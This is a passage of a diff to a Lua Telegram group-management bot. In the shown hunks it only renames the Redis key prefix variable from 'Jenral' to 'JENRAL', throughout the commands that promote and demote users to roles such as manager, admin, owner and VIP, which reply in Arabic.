 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4811,14 +4799,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مدير عام (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مدير عام (%d+)')
-DevALI:sadd(Jenral..'ALI:ManagerAll:',user)
+DevALI:sadd(JENRAL..'ALI:ManagerAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --      Rem ManagerAll    --
 if text ==('تنزيل مدير عام') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:ManagerAll:',result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4828,7 +4816,7 @@ if text and text:match('^تنزيل مدير عام @(.*)') and SourceCh(msg) th
 local username = text:match('^تنزيل مدير عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:ManagerAll:',result.id_)
+DevALI:srem(JENRAL..'ALI:ManagerAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4837,15 +4825,15 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مدير عام (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مدير عام (%d+)')
-DevALI:srem(Jenral..'ALI:ManagerAll:',user)
+DevALI:srem(JENRAL..'ALI:ManagerAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --      Set adminall      --
 if ManagerAll(msg) then
 if text ==('رفع ادمن عام') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:AdminAll:',result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:AdminAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4855,7 +4843,7 @@ if text and text:match('^رفع ادمن عام @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع ادمن عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:AdminAll:',result.id_)
+DevALI:sadd(JENRAL..'ALI:AdminAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4864,14 +4852,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع ادمن عام (%d+)') and SourceCh(msg) then
 local user = text:match('رفع ادمن عام (%d+)')
-DevALI:sadd(Jenral..'ALI:AdminAll:',user)
+DevALI:sadd(JENRAL..'ALI:AdminAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --      Rem adminall      --
 if text ==('تنزيل ادمن عام') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:AdminAll:',result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4881,7 +4869,7 @@ if text and text:match('^تنزيل ادمن عام @(.*)') and SourceCh(msg) th
 local username = text:match('^تنزيل ادمن عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:AdminAll:',result.id_)
+DevALI:srem(JENRAL..'ALI:AdminAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4890,15 +4878,15 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل ادمن عام (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل ادمن عام (%d+)')
-DevALI:srem(Jenral..'ALI:AdminAll:',user)
+DevALI:srem(JENRAL..'ALI:AdminAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Set Vipall       --
 if AdminAll(msg) then
 if text ==('رفع مميز عام') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:VipAll:',result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:VipAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4908,7 +4896,7 @@ if text and text:match('^رفع مميز عام @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مميز عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:VipAll:',result.id_)
+DevALI:sadd(JENRAL..'ALI:VipAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4917,14 +4905,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مميز عام (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مميز عام (%d+)')
-DevALI:sadd(Jenral..'ALI:VipAll:',user)
+DevALI:sadd(JENRAL..'ALI:VipAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Rem Vipall       --
 if text ==('تنزيل مميز عام') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:VipAll:',result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:VipAll:',result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4934,7 +4922,7 @@ if text and text:match('^تنزيل مميز عام @(.*)') and SourceCh(msg) th
 local username = text:match('^تنزيل مميز عام @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:VipAll:',result.id_)
+DevALI:srem(JENRAL..'ALI:VipAll:',result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4943,16 +4931,16 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مميز عام (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مميز عام (%d+)')
-DevALI:srem(Jenral..'ALI:VipAll:',user)
+DevALI:srem(JENRAL..'ALI:VipAll:',user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --   Set ALIConstructor   --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if SudoBot(msg) then
 if text ==('رفع مالك') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه مالك")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -4962,7 +4950,7 @@ if text and text:match('^رفع مالك @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مالك @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه مالك")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -4971,10 +4959,10 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع مالك (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مالك (%d+)')
-DevALI:sadd(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه مالك")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --   Rem ALIConstructor   --
 if text ==('تنزيل مالك') and SourceCh(msg) then
 function prom_reply(extra, result, success)
@@ -4985,7 +4973,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
 else
-DevALI:srem(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من المالكين")  
 end end end
 end,nil)
@@ -5005,7 +4993,7 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
 else
-DevALI:srem(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من المالكين")  
 end end end
 end,nil)
@@ -5023,17 +5011,17 @@ if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
 if tonumber(user) == tonumber(admins[i].user_id_) then  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
 else
-DevALI:srem(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من المالكين")  
 end end end
 end,nil)
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --  Set BasicConstructor  --
 if ALIConstructor(msg) then
 if text ==('رفع منشئ اساسي') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5043,7 +5031,7 @@ if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) th
 local username = text:match('^رفع منشئ اساسي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه منشئ اساسي")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5052,14 +5040,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
 local user = text:match('رفع منشئ اساسي (%d+)')
-DevALI:sadd(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه منشئ اساسي")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --  Rem BasicConstructor  --
 if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5069,7 +5057,7 @@ if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg
 local username = text:match('^تنزيل منشئ اساسي @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله منشئ اساسي")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5078,18 +5066,18 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل منشئ اساسي (%d+)')
-DevALI:srem(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله منشئ اساسي")  
 end end
 if text ==('رفع منشئ اساسي') and not ALIConstructor(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمالكين والمطورين فقط', 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --    Set  Constructor    --
 if BasicConstructor(msg) then
 if text ==('رفع منشئ') and SourceCh(msg) then
 function raf_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5099,7 +5087,7 @@ if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع منشئ @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5108,14 +5096,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
 local user = text:match('رفع منشئ (%d+)')
-DevALI:sadd(Jenral..'ALI:Constructor:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:Constructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنشئين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --    Rem  Constructor    --
 if text ==('تنزيل منشئ') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5125,7 +5113,7 @@ if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل منشئ @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5134,16 +5122,16 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل منشئ (%d+)')
-DevALI:srem(Jenral..'ALI:Constructor:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:Constructor:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنشئين")  
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --      Set Manager       --
 if Constructor(msg) then
 if text ==('رفع مدير') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:Managers:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Managers:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
 end  
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5153,7 +5141,7 @@ if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مدير @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:Managers:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:Managers:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5162,14 +5150,14 @@ resolve_username(username,promreply)
 end 
 if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
 local user = text:match('رفع مدير (%d+)')
-DevALI:sadd(Jenral..'ALI:Managers:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:Managers:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Rem Manager      --
 if text ==('تنزيل مدير') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5179,7 +5167,7 @@ if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل مدير @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5188,14 +5176,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل مدير (%d+)')
-DevALI:srem(Jenral..'ALI:Managers:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:Managers:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء")  
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 --       Set Cleaner      --
 if text ==('رفع منظف') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:sadd(Jenral..'ALI:Cleaner:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Cleaner:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5205,7 +5193,7 @@ if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع منظف @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:Cleaner:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:Cleaner:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5214,14 +5202,14 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
 local user = text:match('رفع منظف (%d+)')
-DevALI:sadd(Jenral..'ALI:Cleaner:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:Cleaner:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المنظفين")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Rem Cleaner      --
 if text ==('تنزيل منظف') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5231,7 +5219,7 @@ if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل منظف @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5240,19 +5228,19 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل منظف (%d+)')
-DevALI:srem(Jenral..'ALI:Cleaner:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:Cleaner:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المنظفين")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Set admin        --
 if Manager(msg) then
 if text ==('رفع ادمن') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-if not BasicConstructor(msg) and DevALI:get(Jenral.."ALI:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevALI:get(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5261,12 +5249,12 @@ end end
 if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع ادمن @(.*)')
 function promreply(extra,result,success)
-if not BasicConstructor(msg) and DevALI:get(Jenral.."ALI:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevALI:get(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5275,18 +5263,18 @@ resolve_username(username,promreply)
 end
 if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
 local user = text:match('رفع ادمن (%d+)')
-if not BasicConstructor(msg) and DevALI:get(Jenral.."ALI:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevALI:get(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_,user)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه")  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --        Rem admin       --
 if text ==('تنزيل ادمن') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_,result.sender_user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5296,7 +5284,7 @@ if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
 local username = text:match('^تنزيل ادمن @(.*)')
 function promreply(extra,result,success)
 if result.id_ then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_,result.id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5305,19 +5293,19 @@ resolve_username(username,promreply)
 end
 if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
 local user = text:match('تنزيل ادمن (%d+)')
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_,user)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_,user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه")  
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 --       Set Vipmem       --
 if Admin(msg) then
 if text ==('رفع مميز') and SourceCh(msg) then
 function prom_reply(extra, result, success)
-if not BasicConstructor(msg) and DevALI:get(Jenral.."ALI:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevALI:get(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
-DevALI:sadd(Jenral..'ALI:VipMem:'..msg.chat_id_,result.sender_user_id_)
+DevALI:sadd(JENRAL..'ALI:VipMem:'..msg.chat_id_,result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5326,12 +5314,12 @@ end end
 if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
 local username = text:match('^رفع مميز @(.*)')
 function promreply(extra,result,success)
-if not BasicConstructor(msg) and DevALI:get(Jenral.."ALI:Lock:ProSet"..msg.chat_id_) then 
+if not BasicConstructor(msg) and DevALI:get(JENRAL.."ALI:Lock:ProSet"..msg.chat_id_) then 
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
 return false
 end
 if result.id_ then
-DevALI:sadd(Jenral..'ALI:VipMem:'..msg.chat_id_,result.id_)
+DevALI:sadd(JENRAL..'ALI:VipMem:'..msg.chat_id_,result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين")  
 else 
